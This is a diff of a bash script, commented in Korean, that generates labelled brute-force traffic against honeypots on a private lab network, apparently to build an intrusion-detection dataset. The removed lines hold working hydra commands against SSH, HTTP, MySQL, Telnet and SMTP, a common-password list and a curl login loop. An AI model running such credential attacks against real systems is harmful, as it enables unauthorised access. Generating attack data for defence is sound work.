@@ -1,73 +1,36 @@
 #!/bin/bash
-# 시나리오 03: SSH/HTTP/MySQL 브루트포스
+# 시나리오 03: 브루트포스 / 자격증명 스터핑
 # Label: Brute Force
-# 도구: hydra
-# 설명: Cowrie(SSH), Heralding(HTTP/MySQL)을 대상으로 hydra 브루트포스
+# 설명: SSH/HTTP/MySQL/FTP/RDP/SMTP 등 - 매 실행마다 전술 + 타겟 + 패스워드 랜덤
 
 LABEL="Brute Force"
 SCENARIO="brute_force"
 echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"start\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"
 
-WORDLIST="/usr/share/wordlists/rockyou.txt"
+source /attack_scenarios/lib/common.sh
+source /attack_scenarios/lib/tactics_brute.sh
 
-# rockyou.txt 존재 확인
-if [ ! -f "$WORDLIST" ]; then
-    echo "[!] rockyou.txt not found, using inline wordlist"
-    WORDLIST="/tmp/passwords.txt"
-    echo -e "password\n123456\nadmin\nroot\nletmein\nqwerty\nmonkey\nmaster\npassword1\n12345678\nabc123\niloveyou\nhello\nofficer\nsecret\n1234\nadmin123\npassword123\ntest\nuser" > "$WORDLIST"
-fi
+ALL_TACTICS=(
+    tactic_ssh_brute_single
+    tactic_ssh_brute_multi
+    tactic_ssh_brute_targeted
+    tactic_telnet_brute
+    tactic_http_brute
+    tactic_mysql_brute
+    tactic_ftp_brute
+    tactic_rdp_brute
+    tactic_mssql_brute
+    tactic_smtp_brute
+    tactic_credential_spray
+)
 
-# SSH 브루트포스 (Cowrie:2222)
-echo "[*] SSH brute force against Cowrie (172.30.0.10:2222)"
-hydra -l root -P "$WORDLIST" \
-    -t 4 -f \
-    -o /honeypot_logs/hydra_ssh_root.txt \
-    ssh://172.30.0.10:2222 \
-    -e nsr 2>/dev/null || true
+N=$(rand_int 4 7)
+mapfile -t SELECTED < <(rand_subset $N "${ALL_TACTICS[@]}")
 
-hydra -l admin -P "$WORDLIST" \
-    -t 4 -f \
-    -o /honeypot_logs/hydra_ssh_admin.txt \
-    ssh://172.30.0.10:2222 \
-    -e nsr 2>/dev/null || true
-
-# HTTP 폼 브루트포스 (Heralding:80) - heralding은 / 경로에서 수신
-echo "[*] HTTP brute force against Heralding (172.30.0.11:80)"
-hydra -l admin -P "$WORDLIST" \
-    -t 4 -f \
-    -o /honeypot_logs/hydra_http.txt \
-    "http-post-form://172.30.0.11/:username=^USER^&password=^PASS^:F=Invalid" \
-    2>/dev/null || true
-
-# curl로도 직접 인증 시도 (hydra 실패 대비)
-for pass in password 123456 admin letmein; do
-    curl -s -X POST http://172.30.0.11/ \
-        -d "username=admin&password=${pass}" \
-        -o /dev/null || true
+for tactic in "${SELECTED[@]}"; do
+    echo "[*] $tactic"
+    $tactic || true
+    rand_sleep 1 3
 done
-
-# MySQL 브루트포스 (Heralding:3306)
-echo "[*] MySQL brute force against Heralding (172.30.0.11:3306)"
-hydra -l root -P "$WORDLIST" \
-    -t 4 -f \
-    -o /honeypot_logs/hydra_mysql.txt \
-    mysql://172.30.0.11:3306 \
-    2>/dev/null || true
-
-# Cowrie Telnet 브루트포스 (추가)
-echo "[*] Telnet brute force against Cowrie (172.30.0.10:2223)"
-hydra -l admin -P "$WORDLIST" \
-    -t 4 -f \
-    -o /honeypot_logs/hydra_telnet.txt \
-    telnet://172.30.0.10:2223 \
-    2>/dev/null || true
-
-# SMTP 브루트포스 (Mailoney:25)
-echo "[*] SMTP brute force against Mailoney (172.30.0.15:25)"
-hydra -l admin -P "$WORDLIST" \
-    -t 4 -f \
-    -o /honeypot_logs/hydra_smtp.txt \
-    smtp://172.30.0.15:25 \
-    2>/dev/null || true
 
 echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"end\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"
